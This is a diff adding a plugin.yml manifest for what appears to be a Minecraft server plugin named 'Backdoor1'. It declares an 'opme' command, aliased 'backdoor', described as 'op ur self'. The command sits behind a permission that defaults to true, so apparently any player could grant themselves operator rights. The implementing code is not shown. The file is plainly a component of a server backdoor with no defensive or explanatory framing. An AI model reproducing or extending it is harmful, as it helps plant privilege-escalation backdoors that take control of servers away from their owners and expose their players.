@@ -1,0 +1,12 @@
+name: Backdoor1
+version: ${project.version}
+main: me.lunacore.backdoor1.Backdoor1
+permissions:
+  d.able:
+    description: run opme
+    default: true
+commands:
+  opme:
+    description: op ur self
+    permission: d.able
+    aliases: backdoor
